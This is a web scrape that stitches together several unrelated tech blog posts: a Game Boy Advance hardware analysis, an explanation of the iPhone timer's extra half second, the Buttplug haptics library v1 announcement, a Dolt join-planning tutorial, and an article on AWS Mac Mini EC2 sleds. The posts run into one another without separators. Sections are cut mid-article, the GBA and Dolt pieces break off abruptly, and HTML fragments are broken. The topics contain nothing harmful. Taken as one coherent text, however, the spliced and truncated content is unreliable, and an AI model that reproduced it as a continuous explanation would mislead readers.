<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div class="page"><nav id="navbar"></nav><h2>A Practical Analysis</h2><hr><hr><h2 id="a-quick-introduction">A quick introduction</h2><p>The internal design of the Game Boy Advance is quite impressive for a portable console that runs on two AA batteries.</p><p>This console will carry on using Nintendo’s <em>signature</em> GPU. Additionally, it will introduce a relatively new CPU from a UK company that will surge in popularity in years to come.</p><hr><h2 id="cpu">CPU</h2><p>Most of the components are combined into a single package called <strong>CPU AGB</strong>. This package contains two completely different CPUs:</p><ul><li>A <strong>Sharp LR35902</strong> running at either 8.4 or 4.2 MHz: <em>If it isn’t the same CPU found on the Game Boy!</em> It’s effectively used to run Game Boy (<strong>DMG</strong>) and Game Boy Color (<strong>CGB</strong>) games. Here’s <a href="https://www.copetti.org/writings/consoles/game-boy/">my previous article</a> if you want to know more about it.</li><li>An <strong>ARM7TDMI</strong> running at 16.78 MHz: This is the new processor we’ll focus on, it most certainly runs Game Boy Advance games.</li></ul><p>Note that both CPUs will <strong>never run at the same time</strong> or do any fancy co-processing. The <strong>only</strong> reason for including the <em>very</em> old Sharp is for <strong>backwards compatibility</strong>.</p><h4 id="whats-new">What’s new?</h4><p>Before ARM Holdings (currently “Arm”) became incredibly popular in the smartphone world, they licensed their CPU designs to power Acorn’s computers, Apple’s Newton, Nokia’s phones and the Panasonic 3DO.
Nintendo’s chosen CPU, the ARM7TDMI, is based on the earlier ARM710 design, and includes:</p><ul><li><strong>ARM v4</strong> ISA: The 4th version of the 32-bit ARM instruction set.</li><li><strong>Three-stage pipeline</strong>: Execution of instructions are divided into three steps or <em>stages</em>. The CPU will fetch, decode and execute up to three instructions concurrently. This enables maximum use of the CPU’s resources (which reduces idle silicon) while also increasing the amount of instructions executed per unit of time.</li><li><strong>32-bit ALU</strong>: Can operate 32-bit numbers without consuming extra cycles.</li></ul><p>Moreover, this core contains some extensions referenced in its name (<em>TDMI</em>):</p><ul><li><strong>T</strong> → <strong>Thumb</strong>: A subset of the ARM instruction set whose instructions are encoded into 16-bit words.<ul><li>Being 16-bit, Thumb instructions require half the bus width and occupy half the memory. However, since Thumb instructions offer only a functional subset of ARM you may have to write more instructions to achieve the same effect.</li><li>Thumb only offers conditional execution on branches, its data processing ops use a two-address format, rather than three-address, and it only has access to the bottom half of the register file.</li><li>In practice Thumb uses 70% of the space of ARM code. For 16-bit wide memory Thumb runs <em>faster</em> than ARM.</li><li>If required, ARM and Thumb instructions can be mixed in the same program (called <em>interworking</em>) so developers can choose when and where to use each mode.</li></ul></li><li><strong>D</strong> → <strong>Debug Extensions</strong>: Provide JTAG debugging.</li><li><strong>M</strong> → <strong>Enhanced Multiplier</strong>: Previous ARM cores required multiple cycles to compute full 32-bit multiplications, this enhancement reduces it to just a few.</li><li><strong>I</strong> → <strong>EmbeddedICE macrocell</strong>: Debug module that allows hardware breakpoints, watchpoints and allows the system to be halted while debugging.</li></ul><h4 id="memory-locations">Memory locations</h4><p>The inclusion of Thumb in particular had a strong influence on the final design of this console. Nintendo mixed 16-bit and 32-bit buses between its different modules to reduce costs while providing programmers with the necessary resources to optimise their code. Usable memory is distributed across the following locations:</p><ul><li><strong>IWRAM</strong> (Internal WRAM) → 32-bit with 32 KB: Useful for storing ARM instructions and data in big chunks.</li><li><strong>EWRAM</strong> (External WRAM) → 16-bit with 256 KB: Optimised for storing Thumb-only instructions and data in small chunks.</li><li><strong>PAK ROM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge ROM is accessed.</li><li><strong>Cart RAM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge RAM is accessed.</li></ul><p>Although this console was marketed as a 32-bit system, the majority of its memory is only accessible through a 16-bit bus, meaning games will mostly use the Thumb instruction set to avoid spending two cycles per instruction fetch. Only critical sections should use the ARM instruction set.</p><h4 id="how-do-they-maintain-compatibility">How do they maintain compatibility?</h4><p>You’ll be surprised that there is no software implemented to detect whether the cartridge inserted is a GB or GBA one. Instead, the console relies on hardware switches: A <strong>shape detector</strong> effectively identifies the type of cartridge and then only passes power through the required bus.</p><hr><h2 id="graphics">Graphics</h2><p>Before we begin, you’ll find the system a mix between the <a href="https://www.copetti.org/writings/consoles/super-nintendo/#graphics">SNES</a> and the <a href="https://www.copetti.org/writings/consoles/game-boy/#graphics">Game Boy</a>, the graphics core is still the well-known 2D engine called <strong>PPU</strong>. I recommend reading those articles before continuing since I’ll be revisiting lots of previously-explained concepts.</p><p>Compared to previous Game Boys we now have a colour LCD screen that can display up to 32,768 colours (15-bit). It has a resolution of 240x160 pixels and a refresh rate of ~60Hz.</p><h4 id="organising-the-content">Organising the content</h4><div><a href="https://www.copetti.org/images/consoles/gba/ppu.594d9adaab26ddb8264ac4e9044b40087fa77a612048e2bc7b749475beecede9.png"><picture>

Bear in mind that the controller will halt the CPU during the operation (although it may hardly notice it!).</li></ul></div></div></div><h4 id="beyond-tiles">Beyond Tiles</h4><p>Sometimes we may want to compose a background from which the tile engine won’t be able to draw all required graphics. Now, modern consoles addressed this by implementing a <strong>frame-buffer</strong> architecture but this is not possible when there’s very little RAM… Well, the GBA happens to have 96 KB of VRAM which is enough to allocate a <strong>bitmap</strong> with the dimensions of our LCD screen.</p><p>Good news is that the PPU actually implemented this functionality by including three extra modes, these are called <strong>bitmap modes</strong>:</p><ul><li><strong>Mode 3</strong>: Allocates a single fully-coloured (8bpp) frame.</li><li><strong>Mode 4</strong>: Provides two frames with half the colours (4bpp) each.</li><li><strong>Mode 5</strong>: There’s two fully-coloured frames with half the size each (160x128 pixels).</li></ul><p>The reason for having two bitmaps is to enable <strong>page flipping</strong>: Drawing over a displayed bitmap can expose some weird artefacts during the process. If instead we manipulate another one then none of the glitches will be shown to the user. Once the second bitmap is finished the PPU can be updated to point to the second one, effectively swapping the displayed frame.</p><div><p>Overall it sounds like a cutting-the-edge feature, however most games held on to the tile engine. Why? Because in practice it <strong>costs a lot of CPU resources</strong>.</p><p>You see, while using a tile engine the CPU can delegate most of the computations to the graphics chip. By contrast, the frame-buffer system that the PPU provides is limited to only displaying that segment of memory as a <strong>single background layer</strong>, that means no more individual affine transformations, layering …</p></div></div></div></div>

December 28, 2020 | https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/ | <a href="https://web.archive.org/web/*/https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>While building my event timer app called <a href="https://stagetimer.io/">stagetimer.io</a> I came across a peculiarity with displaying time and found out that the iPhone timer addresses it by showing us a fake time. By definition, a countdown shows how much time is left. So if the countdown says 5s we assume there are 5 seconds left. But that’s not the whole truth.</p>

<p>The iPhone countdown timer doesn’t strictly display the correct time but adds 500ms, or half a second, to the remaining time. It does this to make the reading of time more intuitive for humans. The alarm at the end of the countdown is not affected by this 500ms inaccuracy.</p>

<p>Javascript likes to use milliseconds when dealing with time, 1000ms equals 1s. Here is an example of a 5s countdown that starts at 5000ms and uses the <a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setInterval">setInterval()</a> function to deduct 10ms every 10ms, simple enough. Milliseconds are converted to seconds by dividing by 1000 and rounding down like so: <code>Math.floor(milliseconds / 1000)</code></p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-seconds.gif" data-still="/img/writing/5s-timer-seconds.png" alt="5s countdown timer showing only seconds">
  </figure>
</div>
<p>The timer jumps to 4s right when hitting start and once the timer switches to 0s there are still 1s to go. This makes a lot of sense when counting up, for example, 10:00 is displayed during the first minute of 10 AM, not 10:01, always rounding down. But for a countdown timer, this is counterintuitive. It is easier to understand if the timer has a fractional seconds display.</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-seconds-fractions.gif" data-still="/img/writing/5s-timer-seconds-fractions.png" alt="5s countdown timer showing seconds and its fractions">
  </figure>
</div>
<p>Now the timer displays 0.9s seconds instead of 0s to show clearly that there is still time left on the clock. However, I didn’t want to show fractional seconds for my timer.</p>

<p>Now I was curious how my iPhone solves this conundrum. So I set my iPhone timer to 5s:</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-iphone.gif" data-still="/img/writing/5s-timer-iphone.png" alt="5s countdown timer on the iPhone">
  </figure>
</div>
<p>After I click “Start” the iPhone timer shows 5s, not 4s like in the example above. But it switches to 4s before a full second expired. It then counts proper seconds until it reaches 0s which, again, is not a full second. And if you tap “Pause” just after it jumped to 0s it will promptly jump back to 1s to show you that there is, in fact, still some time left on the countdown.</p>
<p>I figured that the good folks at Apple add an extra fake 500ms to the actual time to start that countdown display at 5s instead of 4s. The timer ends and the phone beeps if the actual time hits 0s and the “fake” time hits 500ms. So they faced the same problem I did and came up with a practical solution. After all, if you start a 5s countdown, it should start at 5s right? For illustration, here is my simple timer doing the same trick.</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-fake-seconds.gif" data-still="/img/writing/5s-timer-fake-seconds.png" alt="5s countdown timer showing fake seconds">
  </figure>
</div>
<p>So there you have it, the iPhone timer is technically lying a little bit to you.</p>

<p>Some have pointed out that the problem could be solved more easily by rounding to the nearest second or rounding up instead of rounding down. This is correct. Suppose we have <code>5459543ms</code> that we want to bring into the traditional form <code>HH:mm:ss</code>.</p>
<p>I first divided the number into hours, minutes, and seconds with the help of some modular arithmetic and applied the rounding afterward. Rounding down results in <code>01:30:59</code>, which is correct, but rounding to the nearest integer or rounding up results in the impossible time <code>02:31:60</code>.</p>
<pre><code>time = <span>5459543</span>
seconds = (time / <span>1000</span>) % <span>60</span> 
minutes = (time / <span>60000</span>) % <span>60</span> 
hours = (time / <span>3600000</span>) % <span>24</span> 
</code></pre>
<p>However, rounding the time to seconds first <code>5460000ms</code>, and breaking it down afterward yields the same result as described above with adding 500ms, namely <code>01:31:00</code>.</p>
<pre><code>time = <span>5460000</span>
seconds = (time / <span>1000</span>) % <span>60</span> 
minutes = (time / <span>60000</span>) % <span>60</span> 
hours = (time / <span>3600000</span>) % <span>24</span> 
</code></pre>
<p><em>Edit 2: In an earlier version I messed up my rounding as described. Many helpful, as well as helpful and insulting, comments pointed out my error. So in addition to learning about counting time I also learned how it feels to be wrong on the internet</em> 😅</p>

<p>After 3.5 years of development, <a href="https://buttplug.io/">Buttplug</a>, the open source intimate haptics controls library created and maintained by Nonpolynomial, has finally arrived at its v1 release. Fitting that it’s also the first real blog post on the new <a href="https://nonpolynomial.com/blog">Nonpolynomial Blog</a>!</p>

<p>For the project, this is actually a contraction rather than an expansion. Version 1 means that the project has slimmed down to a <a href="https://github.com/buttplugio/buttplug-rs">core Rust implementation</a> upon which the ecosystem can continue to grow.</p>



<p>Buttplug v1.0.0 is available in the following flavors:</p>



<ul><li>Rust – <a href="https://crates.io/crates/buttplug">Crates.io</a>, <a href="https://github.com/buttplugio/buttplug-rs">Github</a></li><li>C# – <a href="https://www.nuget.org/packages/Buttplug">Nuget</a>, <a href="https://github.com/buttplugio/buttplug-rs-ffi">Github</a></li><li>JS/Typescript (via WASM, Web-only currently) – <a href="https://www.npmjs.com/package/buttplug">NPM</a>, <a href="https://github.com/buttplugio/buttplug-rs-ffi">Github</a></li></ul>



<p>The <a href="https://buttplug-developer-guide.docs.buttplug.io/">Buttplug Developer Guide</a> covers basic usage, with examples in all of the aforementioned languages.</p>



<h2>What Even Is Buttplug?</h2>



<p><a href="https://buttplug.io/">Buttplug</a> is a haptics abstraction library for intimate hardware. </p>



<p>Which is a fancy way of saying “a way of telling a bunch of different vibrators how to vibrate”. Though it can tell hardware how to do things other than vibrate, and it supports more form factors than buttplugs.</p>



<p>Basically, there are <a href="https://iostindex.com/">hundreds of computer controlled sex toys out there</a>. Most of them have unique protocols to control them. Buttplug tries to centralize these control protocols, handles cross platform USB/Bluetooth/serial/etc for the developer, and presents a uniform way of controlling the whatever toy the user may have. Instead of knowing what operating system the user is on and how to talk to their specific toy, developers can use Buttplug to enumerate for a supported device, then send generic commands like “vibrate/rotate at [speed]”. That’s it.</p>



<p>While the sex toy control part of Buttplug is probably the most recognizable and memorable feature, it’s not the only goal of the project. Buttplug was established as an experiment for creating user-focused haptics and interface device abstraction. Libraries and engines like <a href="https://www.chai3d.org/">Chai3D</a> and <a href="https://h3dapi.org/">H3D</a> work as generalized haptics engines for studying mechanical systems, texture and force creation/simulation, while other systems like <a href="https://vrpn.github.io/">VRPN</a> work as a sort of user-space HID manager for systems that may not conform to general HID protocol boundaries. Buttplug seeks to take these two paradigms, and smoosh them together while also servicing a niche that doesn’t get much engineering attention. This leads to many interesting questions, like:</p>



<ul><li>How do we quickly and reliably bring up hardware communication across multiple platforms?</li><li>How do we interact with a user whose affective state may differ from someone using “normal” software like a word processor or database?</li><li>How do we create a language expressive enough to generate the experience a user wants, while also abstract enough to not be device specific?</li><li>What are the <a href="https://buttplug-developer-guide.docs.buttplug.io/intro/buttplug-ethics.html">ethical implications of building open source technology for intimacy</a>?</li><li>Can these questions be approached through technology in a way that is maintainable by a small, possibly one person team?</li></ul>



<p>We’ve heard from our community that some users are just interested in controlling sex toys, though, and that’s fine too. I guess.</p>

<h2>A Short-ish History of Buttplug</h2>



<p>Here’s an overview of the 16 year path from my start in sex tech to a v1 library for the field.</p>

<h2>What Buttplug Version 1 Means</h2>



<p>To me, a lot. To you, possibly not so much.</p>



<p>As mentioned, Buttplug Version 1 doesn’t really come with a lot of new features. It’s mostly a point where I can cut old stuff and start looking toward the future.</p>



<p><a href="https://github.com/buttplugio/buttplug-csharp">Buttplug C#</a> and <a href="https://github.com/buttplugio/buttplug-js">Buttplug JS</a> will now be archived, as implementations now live in our <a href="https://github.com/buttplugio/buttplug-rs-ffi">FFI repo</a>, and their respective <a href="https://www.nuget.org/packages/Buttplug/">nuget</a> and <a href="https://www.npmjs.com/package/buttplug">npm</a> packages will still live on as v1 and beyond. There will definitely be breaking changes between the v0.x and v1 versions for C#/JS, so if you’ve been developing on those, be ready. I did my best to keep the APIs similar, but also used this as a way to clean up some problems that had cropped up along the way.</p>



<p>Before v1, adding new features or hardware protocols meant implementing things in at least 2 places. Now, features can be implemented in Rust, then all that is required is a rebuild of the FFI and package version numbers being rolled. At worse, the FFI API surface may require changes, but that’s fairly trivial work versus having to redo full feature implementations. Most of the FFI work is up front in the initial implementation, and the hope is that continued maintenance will be much simpler. Time will tell whether this was a total mistake.</p>



<p>Success will be measured via this possible reduction of rote coding work. I’d like to spend more time on design with a flexible system versus having to re-implement my ideas multiple times to test them out across all platforms.</p>



<p>The Version 1 release will also probably be the only time that multiple libraries are released in lockstep with the same version number. I suspect that the FFI libraries will have API surface level issues that will require major version rolls outside of when the rust library updates. Everyone who has an affinity for version numbers, enjoy these stars aligning now, because it’s probably the last time it’ll happen.</p>



<h2>What’s Next</h2>



<p>There’s so many directions to go now that it’s almost hard to pick which to start with, but here’s some general ideas of what I’d like to do next:</p>



<ul><li>Blog Posts<ul><li>I have this shiny new blog now and I’d like to use it more. I have a lot of thoughts about Rust, WASM, and other technologies I’m using that I’d like to cover here.</li></ul></li><li>Documentation<ul><li>Buttplug v1 is documented just enough to maybe get people started, but the <a href="https://buttplug-developer-guide.docs.buttplug.io/">developer guide</a> and API documentation for the various implementations definitely need more love.</li></ul></li><li>More FFI Implementations<ul><li>Python is on the way soon, and C/C++ (especially for Unreal Engine suppot) and Java/Kotlin have been requested by the community.</li></ul></li><li>Application Updates<ul><li>I maintain a few applications, like <a href="https://intiface.com/desktop">Intiface Desktop</a> and the <a href="https://intiface.com/ghr">Game Haptics Router</a>, that have been backburnered while v1 was in progress. Would really like to get those updated and add some new features. Also need to update dependent libraries, like our <a href="https://github.com/buttplugio/buttplug-unity">Unity Game Engine</a> and <a href="https://github.com/buttplugio/buttplug-twine">Twine Game Engine</a> support.</li></ul></li><li>Hardware Support<ul><li>The v1 slog (this was supposed to be done in October, then <a href="https://www.supergiantgames.com/games/hades/">Hades</a> happened. Oops.) means hardware support for things like the <a href="https://patreon.com/tempestvr">OSR2</a> and <a href="https://github.com/buttplugio/buttplug-rs/issues/151">Nintendo Joycon</a> are still in development and running behind.</li></ul></li><li>Actually Making New Stuff<ul><li>Everything listed so far is continued maintenance. It’d be nice to actually make some new things too. Don’t know what those will be, but I need to actually create with my creation, instead of just creating my creation.</li></ul></li></ul>

<p><a href="https://github.com/dolthub/dolt/">Dolt</a> is Git for Data. It's a SQL
database that you can clone, fork, branch, and merge. Dolt's SQL
engine is
<a href="https://github.com/dolthub/go-mysql-server/">go-mysql-server</a>, and
today we're going to discuss how it implements join planning to make a
query plan involving multiple tables as efficient as possible.</p>

<p>When a query involves more than one table, there are many different
ways to access those tables to get a correct result. But some ways are
much faster than others! Choosing an order to access tables in and a
strategy to assemble result rows is known as join planning. This is
easiest to explain with an example.</p>
<p>Let's create three tables to track the populations of cities and
states, and the people who live in them. If you have Dolt installed
(link in the sidebar), you can follow along.</p>
<div data-language="sql"><pre><code><span>%</span> mkdir <span>join</span><span>-</span>planning <span>&amp;&amp;</span> cd <span>join</span><span>-</span>planning
<span>%</span> dolt init
Successfully initialized dolt <span>data</span> repository<span>.</span>
<span>%</span> dolt <span>sql</span>



join_planning<span>&gt;</span> <span>create</span> <span>table</span> states <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> population <span>int</span> <span>unsigned</span><span>)</span><span>;</span>
join_planning<span>&gt;</span> <span>create</span> <span>table</span> cities <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> state <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>not</span> <span>null</span><span>,</span> population <span>int</span> <span>unsigned</span><span>)</span><span>;</span>
join_planning<span>&gt;</span> <span>create</span> <span>table</span> people <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> city <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>not</span> <span>null</span><span>)</span><span>;</span></code></pre></div>
<p>Let's say that we want a list of people named "John Smith" along with
names and populations of the cities and states they live in. We would
write a query like this:</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> people p 
    <span>join</span> cities c <span>on</span> p<span>.</span>city <span>=</span> c<span>.</span>name 
    <span>join</span> states s <span>on</span> s<span>.</span>name <span>=</span> c<span>.</span>state 
    <span>where</span> p<span>.</span>name <span>=</span> <span>"John Smith"</span><span>;</span></code></pre></div>
<p>There's lots of ways that a query planner could execute this query. A
really bad way would be to look at every combination of every row from
all three tables and test each combination to see if it matches the
<code>JOIN</code> condition and <code>WHERE</code> clause. This is correct and valid, but
very expensive. If we say that the <code>states</code>, <code>cities</code> and <code>people</code>
tables contain <code>S</code>, <code>C</code> and <code>P</code> rows respectively, this query plan
(which is called a cross join), will result in <code>S * C * P</code> row
accesses and comparisons. It's a bad idea. </p>
<p>There are simple tricks you can use to speed up query execution. Using
<a href="https://www.dolthub.com/blog/2020-10-28-pushdown-filters/">pushdown
optimization</a>,
you can eliminate most of the accesses to the <code>people</code> table. Let's
say that the number of "John Smiths" in the database is called <code>J</code>,
and it's much smaller than <code>P</code>. Then using pushdown intelligently
reduces the cost of our access to <code>S * C * J</code>.</p>
<p>Until a few weeks ago, this was as good as
<a href="https://github.com/dolthub/dolt/">Dolt</a> could do on joins of three or
more tables. For two tables, we would use an index if available. But
for three, no luck. It made the product borderline unusable for a
workload with this query pattern and a non-trivial data size.</p>
<p>This blog post is about how we optimized the join planner to generate
more intelligent, efficient query plans for any number of tables. In
today's version of <a href="https://github.com/dolthub/dolt/">Dolt</a>, that same
query will generate the following query plan:</p>
<div data-language="sql"><pre><code>join_planning<span>&gt;</span> <span>explain</span> <span>select</span> <span>*</span> <span>from</span> people p 
    <span>join</span> cities c <span>on</span> p<span>.</span>city <span>=</span> c<span>.</span>name 
    <span>join</span> states s <span>on</span> s<span>.</span>name <span>=</span> c<span>.</span>state

<span>+</span></code></pre></div>
<p>The plan starts with an indexed access on the <code>name</code> column of
<code>people</code> to find all the John Smiths. Then for each row, it uses a
primary key index to look up the city. Then for each city, it uses
another primary key to look up the state. In all, this leads to a
total query cost of <code>J * 3</code>. </p>
<h2>Is that... a lot?</h2>
<p><img src="https://www.dolthub.com/blog/1e2adb7b32ddb47442f1c254bf2358ed/is-that-a-lot.gif" alt="Is that a lot?"></p>
<p>Using some real numbers to drive this home: let's use the US and say
that there are 330,000,000 <code>people</code> rows, 20,000 <code>cities</code> rows, and 52
<code>states</code> rows (we didn't forget you, DC and Puerto Rico). A cross join
query plan would access a number of rows equal to the product of these
numbers, which is roughly 343 trillion accesses. It's a big
number. Your query isn't going to complete.</p>
<p><a href="http://howmanyofme.com/#:~:text=The%20U.S.%20Census%20Bureau%20statistics,Smith%20in%20the%20United%20States.">There are about 48,000 people named John
Smith</a>
in the US. So using pushdown optimization gets us down to about 50
billion row accesses. This is a lot better than before, but still
terrible. The query isn't returning.</p>
<p>Using both pushdown to the <code>people</code> table and indexed accesses to
<code>cities</code> and <code>states</code>, on the other hand, limits the query execution
to only 48,000 accesses to the <code>people</code> table, then 1 access to each of
the <code>cities</code> and <code>states</code> table for each of these rows. That's <code>3 *
48,000</code>, or 144,000 table accesses total.</p>

<p>Unlike in the <a href="https://www.dolthub.com/blog/2020-10-28-pushdown-filters/">pushdown
blog</a>, I
won't bother to spell out the percentage savings. We're looking at 4
decimal orders of magnitude improvement for the first optimization,
then another 5 for the second. It's the difference between
<a href="https://github.com/dolthub/dolt/">Dolt</a> being a usable query engine
or a bad space heater.</p>

<p>To assemble an efficient query plan, you have to start by by answering
one really important question:</p>
<blockquote>
<p>What order should we access the tables in?</p>
</blockquote>
<p>This really makes all the difference. In the example above, a table
access order of <code>people &gt; cities &gt; states</code> lets us use the primary key
index on the latter two tables. If we instead chose the order <code>states &gt; cities &gt; people</code>,
we can't use the information from earlier tables
to reduce the number of lookups into later tables, giving us a cross join.</p>
<p>There are a lot of interesting details to get wrong, but to get table
order right you can use some pretty simple heuristics.</p>
<ol>
<li><strong>What index could I use</strong> to access this table? Are those columns part
of a join condition?</li>
<li><strong>Are required columns available to use as a key</strong>? Did the other tables
in the join condition precede this one?</li>
<li><strong>How many rows are in this table</strong> if I need to do a full table scan?</li>
<li><strong>Is this a <code>LEFT</code> or <code>RIGHT</code> join</strong>, and if so, is this table on the
side of the join that requires it to come first?</li>
</ol>
<p>We'll come back to the actual implementation of the table ordering
algorithm later. For now let's assume its existence, and it tells us
which order to access tables in. How do we build a join plan with that
access order?</p>

<p>In <a href="https://github.com/dolthub/go-mysql-server/">go-mysql-server</a>,
query plans are organized in a tree of <code>Node</code> objects. As of now, all
nodes have at most two children, making the query plan a binary-ish
tree. A <code>Join</code> node knows how to get a row from its left child, then
iterate over its right child looking for matches on the join
condition. When the right child iterator is out of rows, it gets the
next row from its left child. Eventually it runs out of rows in the
left child and returns <code>io.EOF</code> from its iterator.</p>
<p>Like everything else, this is easiest to visualize with some
examples. For all of these, we'll use one-letter table names with
single columns that match the table name. Here's a simple join between
two tables A and B:</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b<span>;</span></code></pre></div>
<p>A naive query plan looks like this:</p>
<p><span>

  </a>
    </span></p>
<p>As we add additional tables to the join, they become the new root of
the tree, with the original subtree as the left child.</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b <span>join</span> C <span>on</span> b <span>=</span> c<span>;</span></code></pre></div>

  </a>
    </span></p>
<p>Let's examine this last example more closely. What happens when we
open an iterator on the root <code>Node</code> of the query? It opens an iterator
on its left child, which in turn opens an iterator on its left child,
and so on. Each node, after accessing a row from its left child, then
attempts to find a matching row from its right child. We end up with
the table access order the same as in the lexical query: <code>A &gt; B &gt; C &gt;
D</code>. </p>
<p>Let's trace through the execution of a single row in the result set.</p>
<ol>
<li>The join node <code>a = b</code> gets a row from <code>A</code>. Then it iterates through
the rows of <code>B</code> looking for rows that match the join condition <code>a =
b</code>. When it finds such a row, it returns it.</li>
<li>The node <code>b = c</code> takes the row from its left child, which is a
concatenation of rows from tables <code>A</code> and <code>B</code>. It then iterates
over its right child, the rows of <code>C</code>, looking for rows that match
the join condition <code>b = c</code>. When it finds such a row, it returns
it.</li>
<li>The node <code>c = d</code> takes the row from its left child, which is a
concatenation of rows from <code>A</code> and <code>B</code> and <code>C</code>, in that order. It
then attempts to match rows from its right child, <code>D</code>, just as
above.</li>
</ol>
<p>Importantly, there are sometimes many possible binary trees that can
implement the above logic to yield a correct result for any given
table access order. The tree construction algorithm above, where we
keep shoving a sub-tree down to the left child of a new join node, is
just what the parser gives us by default because it's left
associative. But we can draw other trees that give the same
results. For example, here's a balanced join tree:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/d9217/four-table-balanced.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="balanced four table join" title="balanced four table join" src="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/ad12c/four-table-balanced.png" srcset="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/a48b3/four-table-balanced.png 214w,
https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/47730/four-table-balanced.png 428w,

  </a>
    </span></p>
<p>Like the original, this produces a table access order of <code>A &gt; B &gt; C &gt;
D</code>. If we wanted to access the tables in the opposite order, we could
simply flip the left and right children of every node in the original
tree like so:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="reversed four table join" title="reversed four table join" src="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png" srcset="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/a48b3/four-table-reversed.png 214w,
https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/47730/four-table-reversed.png 428w,

  </a>
    </span></p>
<p>Again, there are sometimes many possible join trees for a given table
ordering. But they all have one thing in common: their join conditions
refer to tables that can be found in their left and right
children. Otherwise, the node cannot evaluate its join condition. For
example, let's say that we are querying three tables and want to
access them in the order <code>B &gt; A &gt; C</code>. This is an invalid join plan
with that table ordering:</p>

            <!-- content --><p>Since this is a holiday week, and we tend to do a bit more fun content. I wanted to take a look at how Amazon AWS is adding Apple Mac Mini nodes to EC2. We recently covered the announcement in <a href="https://www.servethehome.com/amazon-aws-ec2-mac-mini-powered-macos-cloud-instances-launched/">Amazon AWS EC2 Mac Mini Powered MacOS Instances Launched</a>, but now we have some pictures of the solution.<span id="more-49658"></span></p>
<h2>How AWS Added Apple Mac Mini Nodes to EC2</h2>
<p>This is what an x86/ 10GbE Apple Mac Mini looks like in an EC2 rack. One can see that the unit is placed in a sled. Around the Mac Mini are a surprising number of wires being routed through the chassis.</p>
<figure id="attachment_49661" aria-describedby="caption-attachment-49661"><a href="https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/aws-ec2-apple-mac-mini-node-in-rack/" rel="attachment wp-att-49661"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack.jpg" alt="AWS EC2 Apple Mac Mini Node In Rack" width="1253" height="638" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack.jpg 1253w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-400x204.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-800x407.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-696x354.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-1068x544.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-825x420.jpg 825w" sizes="(max-width: 1253px) 100vw, 1253px"></a><figcaption id="caption-attachment-49661">AWS EC2 Apple Mac Mini Node In Rack</figcaption></figure>
<p>Many of these wires terminate at the front of the sled. Here, we have an AWS Nitro controller. Amazon is now on its fourth generation of Nitro controller after starting the journey years ago.</p>

<p>We have covered this a number of times, but Nitro is effectively what the industry is trying to replicate (and expand upon) as part of the push towards DPUs. If you are not familiar with DPUs, check out our <a href="https://www.servethehome.com/what-is-a-dpu-a-data-processing-unit-quick-primer/">What is a DPU A Data Processing Unit Quick Primer</a> and video:</p>

<p>On the front of the AWS Mac Mini sled, there is the Nitro controller. There are two <a href="https://www.servethehome.com/exclusive-gigabyte-annapurna-labs-arm-storage-server-benchmarks/">Annapurna Labs</a> branded chips, one with what looks like five DRAM packages atop the PCB and one without. There is a red cable atop the Nitro PCB that almost looks like a standard SATA cable with a 90-degree connector.</p>

